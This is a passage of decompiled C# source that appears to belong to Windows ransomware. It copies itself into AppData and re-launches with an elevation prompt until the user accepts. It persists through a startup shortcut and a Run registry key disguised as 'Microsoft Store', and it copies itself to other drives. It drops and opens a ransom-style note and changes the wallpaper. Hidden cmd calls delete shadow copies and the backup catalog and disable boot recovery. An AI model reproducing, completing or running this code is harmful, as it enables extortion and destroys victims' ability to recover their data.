			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
